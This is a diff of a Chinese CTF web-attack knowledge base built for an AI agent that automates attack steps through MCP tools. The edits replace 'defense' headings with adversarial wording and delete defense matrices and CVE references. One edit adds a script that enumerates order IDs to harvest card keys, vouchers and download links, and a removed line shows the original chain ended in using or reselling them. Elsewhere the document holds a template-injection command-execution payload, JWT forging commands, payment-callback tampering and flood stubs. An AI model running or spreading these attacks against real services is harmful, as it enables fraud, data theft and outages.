@@ -342,7 +342,7 @@ requests.post("https://target.com/verify", data={
 6. 自动化 → Playwright + Stealth + Capsolver 扩展
 ```
 
-## 防御绕过检测
+## 对抗点绕过检测
 
 ```python
 # 检测自动化框架
@@ -535,7 +535,7 @@ grep -v -F -f cloudflare_ips.txt all_ips.txt > candidate_ips.txt
 | 按信号查知识库 | `kb_router` | 搜索 cloudflare bypass 等相关技术 |
 | 子域名爆破 | `run_ctf_tool dirsearch` 或 ffuf | 枚举子域名获取更多 IP |
 
-## 证据与验证闭环
+## Evidence
 
 - 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
 - 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
@@ -851,7 +851,7 @@ print(f"[+] 导出 {len(targets)} 条资产")
 | HTTP 探测确认资产存活 | `http_probe` | 验证 FOFA 资产是否存活 |
 | 按信号查知识库 | `kb_router` | 搜索 fofa recon 等相关技术 |
 
-## 证据与验证闭环
+## Evidence
 
 - 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
 - 将“页面可见变化”与服务端内容授权分开记录；只有正文差分、状态变化或 Flag 可重复出现才算确认。
@@ -1084,7 +1084,7 @@ AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
 建立 HTTP baseline → 枚举路由/参数/版本信号 → 交叉验证指纹 → `kb_router` 选技术分支 → 最小 probe → 证据落盘。
 
 
-## 证据与验证闭环
+## Evidence
 
 - 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
 - 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
@@ -1328,7 +1328,7 @@ AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
 建立 HTTP baseline → 枚举路由/参数/版本信号 → 交叉验证指纹 → `kb_router` 选技术分支 → 最小 probe → 证据落盘。
 
 
-## 证据与验证闭环
+## Evidence
 
 - 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
 - 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
@@ -1613,7 +1613,7 @@ base64url(Header).base64url(Payload).base64url(Signature)
 | 06 | `jwt-claim-missing.md` | Claim 缺失 + 混用 | exp/aud/iss 未验证，ID Token 当 Access Token |
 | 07 | `jwt-theft-replay.md` | 窃取与重放 | XSS/日志/Referer 泄露 + 无状态无法撤销 |
 | 08 | `jwt-cve-library.md` | CVE与依赖库 | 库实现缺陷导致验签绕过 |
-| 09 | `jwt-toolchain-defense.md` | 工具链+防御 | 攻击套件、标准流程、防御矩阵 |
+| 09 | `jwt-toolchain-defense.md` | 工具链+对抗 | 攻击套件、标准流程、对抗矩阵 |
 
 ## 快速决策树
 
@@ -1909,7 +1909,7 @@ AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
 捕获原始 Token → 解码 header/claims → 一次验证一个签名或校验假设 → 构造最小变体 → 访问同一权限 oracle → 对比身份/权限/Flag。
 
 
-## 证据与验证闭环
+## Evidence
 
 - 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
 - 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
@@ -2125,7 +2125,7 @@ AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
 捕获原始 Token → 解码 header/claims → 一次验证一个签名或校验假设 → 构造最小变体 → 访问同一权限 oracle → 对比身份/权限/Flag。
 
 
-## 证据与验证闭环
+## Evidence
 
 - 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
 - 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
@@ -2358,7 +2358,7 @@ AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
 捕获原始 Token → 解码 header/claims → 一次验证一个签名或校验假设 → 构造最小变体 → 访问同一权限 oracle → 对比身份/权限/Flag。
 
 
-## 证据与验证闭环
+## Evidence
 
 - 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
 - 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
@@ -2640,7 +2640,7 @@ AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
 捕获原始 Token → 解码 header/claims → 一次验证一个签名或校验假设 → 构造最小变体 → 访问同一权限 oracle → 对比身份/权限/Flag。
 
 
-## 证据与验证闭环
+## Evidence
 
 - 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
 - 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
@@ -2917,7 +2917,7 @@ AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
 捕获原始 Token → 解码 header/claims → 一次验证一个签名或校验假设 → 构造最小变体 → 访问同一权限 oracle → 对比身份/权限/Flag。
 
 
-## 证据与验证闭环
+## Evidence
 
 - 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
 - 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
@@ -3488,7 +3488,7 @@ AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
 捕获原始 Token → 解码 header/claims → 一次验证一个签名或校验假设 → 构造最小变体 → 访问同一权限 oracle → 对比身份/权限/Flag。
 
 
-## 证据与验证闭环
+## Evidence
 
 - 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
 - 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
@@ -3728,7 +3728,7 @@ AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
 捕获原始 Token → 解码 header/claims → 一次验证一个签名或校验假设 → 构造最小变体 → 访问同一权限 oracle → 对比身份/权限/Flag。
 
 
-## 证据与验证闭环
+## Evidence
 
 - 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
 - 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
@@ -3737,14 +3737,14 @@ AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
 
 
 ---
-## [ctf-website] JWT 工具链、攻击流程与防御矩阵
+## [ctf-website] JWT 工具链、攻击流程与对抗矩阵
 ### JWT Toolchain, Attack Workflow, and Defense Matrix
 URL: https://ling71671.github.io/open-reverselab/kb/ctf-website/02-auth/jwt/09-toolchain-defense/
 Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/techniques/02-auth/jwt/09-toolchain-defense.md
 
 > >
 
-# JWT 工具链、攻击流程与防御矩阵
+# JWT 工具链、攻击流程与对抗矩阵
 
 ## 1. 完整工具链
 
@@ -3960,7 +3960,7 @@ python3 jwt_tool.py <original> -X n -I -pc "role" -pv "admin"
 
 ---
 
-## 5. 防御矩阵
+## 5. 对抗矩阵
 
 ### 服务端
 
@@ -4018,7 +4018,7 @@ AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
 
 | 攻击步骤 | MCP 工具 | 说明 |
 |---------|---------|------|
-| 防御措施验证 | `http_probe` | HTTP GET 探测验证 JWT 防御配置 |
+| 对抗措施验证 | `http_probe` | HTTP GET 探测验证 JWT 对抗配置 |
 | jwt_tool 工具检查 | `ctf_tool_status` | 检查 CTF 工具安装状态 |
 
 
@@ -5563,7 +5563,7 @@ AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
 | HTTP 参数污染探测 | `http_probe` | 发送 HPP/CRLF payload |
 | 按信号查技术 | `kb_router` | 搜索 hpp/crlf 相关技术文件 |
 
-## 证据与验证闭环
+## Evidence
 
 - 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
 - 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
@@ -5870,7 +5870,7 @@ AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
 | HTTP 探测 | `http_probe` | 发送 prototype pollution payload |
 | 按信号查技术 | `kb_router` | 搜索 prototype pollution 相关技术文件 |
 
-## 证据与验证闭环
+## Evidence
 
 - 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
 - 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
@@ -6616,7 +6616,7 @@ Java 模板引擎可以通过实例化 Java Runtime 类直接执行命令：
     # 通用执行命令: product.getClass().forName("java.lang.Runtime")...
     ${product.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("whoami")}
     ```
-    原理：Model Bean 不经 `TemplateClassResolver`，getter 方法自由可调。防御需用 `TemplateModel` 接口包装 model 对象，而非仅依赖 `?new()` 拦截。
+    原理：Model Bean 不经 `TemplateClassResolver`，getter 方法自由可调。对抗需用 `TemplateModel` 接口包装 model 对象，而非仅依赖 `?new()` 拦截。
 
 ---
 
@@ -6887,7 +6887,7 @@ AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
 | 开放重定向探测 | `http_probe` | HTTP GET 探测开放重定向入口点 |
 | 知识检索 | `kb_router` | 按开放重定向信号搜索知识库 |
 
-## 证据与验证闭环
+## Evidence
 
 - 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
 - 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
@@ -7488,6 +7488,7 @@ Java RMI → JRMPListener → 反弹连接 → RCE
 .NET ViewState → ysoserial.net → ObjectDataProvider → cmd 执行
 Ruby YAML → ERB gadget → `id` → RCE
 YAML 反序列化 → 文件读取 → .env → 数据库密码 → 数据泄露
+```
 
 ## 9. Advanced Deserialization (2024-2025)
 
@@ -7539,7 +7540,7 @@ AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
 | 反序列化端点探测 | `http_probe` | HTTP GET 探测反序列化入口点 |
 | 知识检索 | `kb_router` | 按反序列化攻击信号搜索知识库 |
 
-## 证据与验证闭环
+## Evidence
 
 - 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
 - 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
@@ -8280,7 +8281,7 @@ fetch('https://target.com/api/transfer', {
 ```
 SameSite=Lax:   GET 导航会发 cookie，POST 不发的 → 找 GET 可触发的状态变更
 SameSite=None:  无保护，但必须 Secure=true (HTTPS)
-SameSite=Strict: 最安全，同站才发
+SameSite=Strict: 最严格，同站才发
 
 SameSite Lax 绕过:
   - GET /api/deleteUser?id=1 → 状态变更在 GET 上
@@ -8315,7 +8316,7 @@ AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
 | 知识检索 | `kb_router` | 按 CORS/CSRF 信号搜索知识库 |
 ```
 
-## 证据与验证闭环
+## Evidence
 
 - 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
 - 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
@@ -8662,7 +8663,7 @@ AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
 定位入口脚本 → 静态格式化/AST → 运行时 hook 参数与返回值 → 对齐网络请求 → 复现关键算法 → 提取 Flag 或服务端攻击面。
 
 
-## 证据与验
+## Evid
 
 [... content truncated for size ...]
 
@@ -10163,7 +10164,7 @@ class FontFeatureValuesMapIterationSource {
 
 迭代过程中调用 `map.delete()` + `map.set()` 触发 HashMap rehash → 旧存储区释放 → `aliases_` 悬空 → `FetchNextItem()` 访问已释放内存 → **UAF**。
 
-### 修复方案
+### Patch 方案
 
 ```cpp
 // 修复后：值拷贝，rehash 不影响副本
@@ -10350,7 +10351,7 @@ Valkey / Redis 全部版本。修复提交：Valkey `fea0b4064`（2026-05-05，P
 
 RDB_TYPE_HASH_ZIPMAP = 9，`rdbLoadObject` 中对应分支仍会调用 `zipmapValidateIntegrity` + `zipmapNext`。
 
-### 修复原理
+### Patch 原理
 
 ```c
 // zipmapValidateIntegrity 中增加 canonical 检查
@@ -12437,7 +12438,7 @@ with socket.create_connection(("target", 6379)) as s:
 | handleParseResults | `PING\r\n` | `MULTIBULK` | `resetClient`，旧版不清 `reqtype` | `reqtype` 仍为 MULTIBULK |
 | 第二次 parseInputBuffer | `PING\r\n` | `MULTIBULK` | 跳过类型检测，仍走 multibulk | **`qb_pos` 处是 `P`，断言失败** |
 
-### 修复 diff
+### Patch diff
 
 ```c
 // handleParseResults 中的 NEGATIVE_MBULK_LEN 分支
@@ -13846,14 +13847,16 @@ Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/te
 攻击者知道订单号 → GET /orders/{id} → 返回完整订单含卡密
 ```
 
-**真实 CVE 先例**：
+## 判定矩阵
 
-| CVE | 产品 | 漏洞 |
-|-----|------|------|
-| CVE-2026-25757 | Spree Commerce | 未认证用户凭订单号查看访客订单 PII，`authorize_access` 对 `user_id=nil` 直接返回 true |
-| CVE-2026-32270 | Craft Commerce | 匿名支付邮箱验证失败，JSON 错误响应仍序列化返回完整订单对象 |
-| CVE-2025-12919 | EverShop | GraphQL `order` 查询无鉴权，UUID 可枚举，泄露姓名/邮箱/地址/支付状态 |
-| CVE-2024-33003 | SAP Commerce (CVSS 9.1) | 优惠券/卡密在 URL 参数中泄露，可被日志/Referer 头截获 |
+| 信号 | 直接动作 | 命中样本 | 失败样本 |
+|------|----------|----------|----------|
+| 订单号自增或短随机串 | 匿名/B 账号请求 A 订单详情 | 返回 `status/amount/card_key/download_url` | 只返回公共状态或 404 |
+| 邮件链接含 `order_id/token` | 改 `order_id`、保留 token、换账号访问 | token 不绑定订单或邮箱 | token 与订单/邮箱强绑定 |
+| 退信含原始正文 | 用不存在邮箱下单，解析 NDR multipart | 原始 HTML/文本里有卡密/下载链接 | 只返回 SMTP headers |
+| 退信 webhook 暴露 | 构造 DSN JSON/XML/表单回调 | 回调响应带订单对象或触发重发 | 仅接受真实队列事件 |
+| 订单查询 GraphQL | 替换 `id/orderNo/email` 参数 | 非所有者读到订单节点 | resolver 过滤当前用户 |
+| 下单即预生成卡密 | 未支付订单触发通知/退信 | 未支付也能看到卡密字段 | 发货时才生成卡密 |
 
 ## 攻击链
 
@@ -13869,7 +13872,7 @@ Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/te
    a. 发送大量邮件到 @nonexist.example.com → 触发退信
    b. 分析退信内容，提取卡密字段
    c. 如果退信是 webhook 回调：模拟 NDR 格式 POST 到系统退信端点
-6. 批量枚举：遍历订单号 → 收集卡密 → 使用/转售
+6. 批量枚举：遍历订单号 → 收集卡密/下载链接/flag → 回填命中与失败样本
 ```
 
 ## Frida/JS Hook 辅助
@@ -13906,7 +13909,7 @@ def test_order_idor(base_url, order_id_range):
     for oid in order_id_range:
         # 不带 Cookie 请求
         r = requests.get(f"{base_url}/api/order/detail", params={"id": oid})
-        if r.status_code == 200 and "卡密" in r.text or "voucher" in r.text.lower():
+        if r.status_code == 200 and ("卡密" in r.text or "voucher" in r.text.lower()):
             print(f"[!] IDOR found: order {oid} leaks card key")
             print(f"    Response: {r.text[:500]}")
 
@@ -13923,17 +13926,50 @@ def test_order_idor(base_url, order_id_range):
 test_order_idor("https://target.com", range(1000, 1100))
 ```
 
-## 防御
+### 订单窗口枚举器
 
-| 层面 | 措施 |
-|------|------|
-| **订单查询** | 必须验证请求者身份（session/token），不能仅凭订单号 |
-| **访客订单** | 访客订单也应有随机 token，不能因为 `user_id=NULL` 就跳过鉴权 |
-| **退信处理** | 退信回调接口必须验证来源（IP 白名单、HMAC 签名、邮件服务器专用凭证） |
-| **退信内容** | 配置邮件服务器仅回传邮件头（headers），不包含原始邮件正文 |
-| **卡密生成** | 仅在支付确认后生成并发送卡密，下单时不预生成；或预生成但不通过邮件明文传输 |
-| **订单号** | 使用 UUID v4 代替自增 ID 作为外部订单号，增加枚举难度 |
-| **频率限制** | 对订单查询接口加 rate limiting，防止批量枚举 |
+```python
+import csv
+import re
+import requests
+
+KEY_RX = re.compile(r"(card[_-]?key|voucher|coupon|download|flag\{[^}]+\})", re.I)
+
+def enumerate_orders(base, start, end, cookie=None):
+    s = requests.Session()
+    if cookie:
+        s.headers["Cookie"] = cookie
+    rows = []
+    for oid in range(start, end + 1):
+        for path in (f"/order/{oid}", "/api/order/detail"):
+            params = {} if path.startswith("/order/") else {"id": oid}
+            r = s.get(base + path, params=params, timeout=8, allow_redirects=False)
+            hit = bool(KEY_RX.search(r.text))
+            rows.append({
+                "order_id": oid,
+                "path": path,
+                "status": r.status_code,
+                "length": len(r.text),
+                "hit": hit,
+                "sample": r.text[:160].replace("\n", "\\n"),
+            })
+            if hit:
+                print("[hit]", oid, path, r.text[:240])
+    with open("order_bounce_idor_matrix.csv", "w", newline="", encoding="utf-8") as f:
+        w = csv.DictWriter(f, fieldnames=rows[0].keys())
+        w.writeheader()
+        w.writerows(rows)
+```
+
+## 下一跳矩阵
+
+| 命中结果 | 下一步 | 关联文档 |
+|----------|--------|----------|
+| 读到卡密/下载链接 | 检查是否绑定订单所有者、是否可重复领取 | `payment-digital-goods.md` |
+| 读到支付状态/金额 | 尝试替换回调里的 `order_id/out_trade_no` | `payment-callback-async.md` |
+| 读到邮箱/手机号 | 构造退信、找邮件模板、找通知重发接口 | 本文 |
+| 读到商品/sku/plan | 做低价 SKU + 高价权益错配 | `payment-logic.md` |
+| 读到数据库字段名 | 反推订单表、卡密表、优惠券表 | `../24-database/05-backup-log-leak.md` |
 
 ## MCP 工具映射
 
@@ -13946,20 +13982,12 @@ AI Agent 可调用以下 MCP 工具自动检测上述漏洞：
 | 阅读技术细节 | `kb_read_file` | 读取本文档获取完整攻击链 |
 | 批量测试 | 编写 Python 脚本 | 循环枚举订单号，检测 IDOR |
 
-## 参考资料
-
-- [CVE-2026-25757] Spree Commerce — Unauthenticated Guest Order Access via IDOR
-- [CVE-2026-32270] Craft Commerce — Anonymous Payment Order Data Leak in Error Response
-- [CVE-2025-12919] EverShop — GraphQL Order Query Without Authentication
-- [CVE-2024-33003] SAP Commerce Cloud — Voucher Codes Exposed in URLs (CVSS 9.1)
-- [CWE-639] Authorization Bypass Through User-Controlled Key
-- [CWE-200] Exposure of Sensitive Information to an Unauthorized Actor
-
 ## Evidence
 
 - `order_probe_matrix.csv`: order_id、email/token、登录态、状态码、响应长度、关键字段。
 - `bounce_payloads.json`: 退信/邮件链接里的订单号、签名、一次性 token、过期时间。
 - `role_compare.json`: 匿名、订单所有者、其他用户、管理员的响应字段 diff。
+- `order_bounce_idor_matrix.csv`: 订单窗口枚举输出、命中字段、响应样本。
 - 成功样本: 非订单所有者读到订单、支付状态、下载链接、优惠券或 flag。
 - 失败样本: 只返回公共状态、链接过期、token 绑定邮箱或订单所有者。
 
@@ -13995,6 +14023,30 @@ Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/te
 | Notify / Callback | `trade_status`, `paid_at`, `transaction_id`, `signature`, `raw_body` | `/notify`, `/callback`, `/webhook`, `/pay/success` |
 | Entitlement | `vip`, `subscription_until`, `credits`, `tokens`, `download_key`, `account_id` | `/me`, `/orders/:id/deliver`, `/api/user` |
 | Refund / Cancel | `refund_id`, `refund_amount`, `reason`, `status` | `/refund`, `/order/cancel` |
+
+### 0.1 SQL/支付交叉攻击面
+
+支付题经常不是单点绕过，而是“请求字段 → 订单表 → 支付流水 → 权益表”的账本错位。每个接口都要问：它读的是哪张表，写的是哪张表，状态从哪里来。
+
+| 支付字段 | 常见数据库字段 | 可打错位 |
+|----------|----------------|----------|
+| `order_id`, `out_trade_no` | `orders.id`, `orders.out_trade_no` | 自增 IDOR、回调绑定他人订单 |
+| `amount`, `total_fee`, `pay_amount` | `orders.amount`, `payments.amount` | 创建价、支付价、发货价三者不一致 |
+| `status`, `trade_status` | `orders.status`, `payments.status` | 回调只改流水，发货只看订单 |
+| `transaction_id`, `notify_id` | `payments.transaction_id` | 重放、空幂等键、跨订单复用 |
+| `coupon_id`, `balance` | `coupon_logs`, `wallet_logs` | 折扣重复、余额负数、退款后残留 |
+| `sku`, `plan_id`, `goods_id` | `products`, `plans`, `entitlements` | 低价商品拿高价权益 |
+
+账本 diff 模板：
+
+```json
+{
+  "before": {"order_status": "pending", "amount": 100, "credits": 0},
+  "request": {"path": "/notify", "order_id": "1001", "amount": "0.01", "status": "success"},
+  "after": {"order_status": "paid", "payment_amount": 0.01, "credits": 1000},
+  "mismatch": ["order.amount != payment.amount", "credits increased before provider verified"]
+}
+```
 
 ### 首轮黑盒记录模板
 
@@ -14177,7 +14229,7 @@ for k, vals in mutations.items():
 
 ### 3.1 常见错误状态流
 
-安全状态流：
+期望状态流：
 
 ```mermaid
 stateDiagram-v2
@@ -14188,7 +14240,7 @@ stateDiagram-v2
   paid --> refunded: verified refund
 ```
 
-危险流：
+可打状态流：
 
 - `GET /pay/success?order_id=...` 直接把订单改成 paid。
 - `POST /order/update` 接受 `status=paid`。
@@ -14231,9 +14283,9 @@ def try_status(order_id):
 
 ## 4. 回调/通知签名绕过
 
-### 4.1 必须校验的字段
+### 4.1 回调字段拆解
 
-支付回调不能只看 `order_id` 和 `status`，至少要校验：
+支付回调如果只看 `order_id` 和 `status`，通常就能从这些字段拆开打：
 
 - Provider 签名：`sign`, `signature`, `X-Signature`, `Wechatpay-Signature`, `Stripe-Signature`
 - `out_trade_no/order_id` 与本地订单绑定
@@ -14342,51 +14394,7 @@ with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
 
 支付题最好准备两个普通账号：
 
-| 操作 | A 订单 | B session | 预期 |
-|---|---|---|---|
-| B GET A order | A `order_id` | B cookie | 403/404 |
-| B pay A order | A `order_id` | B cookie | 403/404 |
-| B deliver A order | A `order_id` | B cookie | 403/404 |
-| notify A order with B amount | A order + fake tx | no/any cookie | reject |
-
-IDOR 探针：
-
-```python
-import requests
-
-BASE = "https://target"
-A = requests.Session()
-B = requests.Session()
-
-order_id = "A_ORDER_ID"
-for path in [
-    f"/api/orders/{order_id}",
-    f"/api/orders/{order_id}/pay",
-    f"/api/orders/{order_id}/deliver",
-    f"/api/orders/{order_id}/refund",
-]:
-    for sname, sess in [("A", A), ("B", B)]:
-        for method in ("GET", "POST"):
-            r = sess.request(method, BASE + path, timeout=15, allow_redirects=False)
-            print(sname, method, path, r.status_code, len(r.content), r.text[:120])
-```
-
-## 7. 优惠券 / 余额 / 积分组合
-
-组合优先级：
-
-1. `coupon_id` 与 `product_id` 不绑定。
-2. 优惠金额可超过订单金额。
-3. 优惠券重复使用/并发使用。
-4. 余额支付时 `amount=0` 仍发货。
-5. 退款返还余额但不撤销权益。
-
-Payload：
-
-```json
-{"coupon_id": "FREE"}
-{"coupon_id": -1}
-{"coupon_id": [1,1
+| 操作 | A 订单 | B sess
 
 [... content truncated for size ...]
 
@@ -18816,7 +18824,7 @@ Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/te
 
 ## 场景
 
-Mass Assignment（批量赋值/属性注入）发生于后端框架自动将请求参数绑定到模型属性时，未显式定义 allowlist（白名单）或 blocklist（黑名单），导致攻击者可以覆盖模型上不应由用户控制的属性。Laravel `$fillable`、Rails `strong_parameters`、Spring Boot `@ModelAttribute`、Django `ModelForm` 等均有不同形式的 mass assignment 防御，但每个框架都有自己的绕过方式。
+Mass Assignment（批量赋值/属性注入）发生于后端框架自动将请求参数绑定到模型属性时，未显式定义 allowlist（白名单）或 blocklist（黑名单），导致攻击者可以覆盖模型上不应由用户控制的属性。Laravel `$fillable`、Rails `strong_parameters`、Spring Boot `@ModelAttribute`、Django `ModelForm` 等均有不同形式的 mass assignment 对抗，但每个框架都有自己的绕过方式。
 
 ## 输入信号
 
@@ -19503,7 +19511,7 @@ Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/te
 
 ## 场景
 
-速率限制（Rate Limiting）是网络应用最常见的反自动化防御。高水平的绕过不在于消除限制，而在于理解限制的实现层级：IP 粒度、用户粒度、会话粒度、还是全局计数器。每种实现都有不同的绕过路径。本文件覆盖从基础设施层到应用层的完整绕过方法论。
+速率限制（Rate Limiting）是网络应用最常见的反自动化对抗。高水平的绕过不在于消除限制，而在于理解限制的实现层级：IP 粒度、用户粒度、会话粒度、还是全局计数器。每种实现都有不同的绕过路径。本文件覆盖从基础设施层到应用层的完整绕过方法论。
 
 ## 输入信号
 
@@ -22285,7 +22293,7 @@ class OAuthStateAttack:
         # 3. 诱导受害者访问该 URL
         # 4. 服务端用 ATTACKER_CODE 交换 token → 受害者账号绑定了攻击者的 OAuth 账号
 
-        # 防御: state 参数绑定到用户 session
+        # 对抗: state 参数绑定到用户 session
         # 如果 state 缺失或可预测 → CSRF 攻击
 
         return {
@@ -23314,7 +23322,7 @@ class CordovaConfigScanner:
 ### InAppBrowser Abuse
 
 ```javascript
-// InAppBrowser — 最危险的 Cordova 插件之一
+// InAppBrowser — 最高价值的 Cordova 插件之一
 // 允许应用内打开 Web 页面
 // 但 executeScript 方法可在任意已加载页面执行 JS
 
@@ -23525,7 +23533,7 @@ def detect_flutter_build_type(apk_path):
         if 'assets/kernel_blob.bin' in z.namelist():
             return 'DEBUG_MODE — Dart source can be extracted'
 
-        # release 模式只有 libflutter.
+        # release 模式只有 libflutter
 
 [... content truncated for size ...]
 
@@ -24516,11 +24524,11 @@ class DNSAmplificationScanner:
 # results = asyncio.run(scanner.scan_network(resolvers))
 ```
 
-### DNS 放大防御
+### DNS 放大对抗
 
 ```python
 class DNSAmplificationMitigation:
-    """DNS 放大防御措施 — 服务端"""
+    """DNS 放大对抗措施 — 服务端"""
 
     @staticmethod
     def configure_response_rate_limiting(bind_config_path: str) -> str:
@@ -24916,7 +24924,7 @@ Rust     regex       DFA 引擎                 极低
 7. "Static Analysis for Regular Expression Exponential Runtime via Substructural Logics" — 2016
 8. OWASP: Regular expression Denial of Service - ReDoS
 9. rxxr: ReDoS static analysis tool (JavaScript)
-10. "ReDoS 检测与防御" — OWASP Cheat Sheet Series
+10. "ReDoS 检测与对抗" — OWASP Cheat Sheet Series
 
 ## MCP 工具映射
 
@@ -24926,7 +24934,7 @@ Rust     regex       DFA 引擎                 极低
 | 正则分析 | `kb_router` | 搜索 redos / regex_dos / regular_expression |
 | 技术查阅 | `kb_read_file` | 读取本文件完整攻击方法 |
 
-## 证据与验证闭环
+## Evidence
 
 - 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
 - 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
@@ -25257,7 +25265,7 @@ function quic_cid_exhaust(target, cid_count=1000000):
 | 技术搜索 | `kb_router` | 搜索 http2 / h2 / continuation / rapid_reset |
 | CVE 查阅 | `kb_read_file` | 读取本文件及 01-application-layer-dos (Rapid Reset) |
 
-## 证据与验证闭环
+## Evidence
 
 - 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
 - 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
@@ -25562,7 +25570,7 @@ function tcp_buffer_pressure(target, port=80, connections=500):
 | 技术搜索 | `kb_router` | 搜索 syn_flood / sockstress / tcp_dos |
 | 技术查阅 | `kb_read_file` | 读取本文件及 01-application-layer-dos |
 
-## 证据与验证闭环
+## Evidence
 
 - 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
 - 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
@@ -25711,7 +25719,7 @@ function nxdomain_flood(target_domain, qps=30000, duration_sec=600):
     """
     NXDOMAIN flood — 大量查询不存在的子域
 
-    防御难点:
+    对抗难点:
       - 无恶意 payload，全是合法 DNS 查询
       - 源 IP 来自合法递归器 (而非攻击者直接发包)
       - 每个子域不同 → rate limit 按子域分别计数无效
@@ -25899,7 +25907,7 @@ DNSSEC DoS:    攻击 DNS 服务器本身
 | 技术搜索 | `kb_router` | 搜索 dns_dos / water_torture / phantom |
 | 技术查阅 | `kb_read_file` | 读取本文件及 03-amplification-drdos |
 
-## 证据与验证闭环
+## Evidence
 
 - 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
 - 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
@@ -28800,7 +28808,7 @@ function getCookieDomain(hostname) {
 - [version-fingerprinting](../01-recon/version-fingerprinting.md) — CMS 平台指纹
 - [cloudflare-bypass](../01-recon/cloudflare-bypass.md) — CDN 源站绕过
 
-## 证据与验证闭环
+## Evidence
 
 - 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
 - 将“页面可见变化”与服务端内容授权分开记录；只有正文差分、状态变化或 Flag 可重复出现才算确认。
@@ -31497,6 +31505,19 @@ Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/te
 
 `配置泄露` `连接字符串` `.env` `config.php` `web.config` `数据库密码` `源码泄露` `备份文件` `phpinfo` `debug模式` `ThinkPHP配置` `Laravel .env` `Spring Boot` `Django settings`
 
+## 0. 输入信号与凭证落点
+
+配置泄露不要停在“文件可读”，要立刻判断凭证能打到哪里：本地 MySQL、内网 Redis、云 RDS、队列、对象存储，还是支付网关密钥。
+
+| 输入信号 | 重点字段 | 下一步 |
+|----------|----------|--------|
+| `.env` / `application.yml` | `DB_HOST`, `DB_PORT`, `DATABASE_URL`, `REDIS_URL` | 解析连接串，判断内网/公网/容器名 |
+| `config/database.php` | `host`, `database`, `username`, `password`, `prefix` | 关联表前缀和支付/订单表 |
+| `web.config` / `appsettings.json` | `connectionStrings`, `DefaultConnection` | MSSQL/PostgreSQL 连接尝试与表名枚举 |
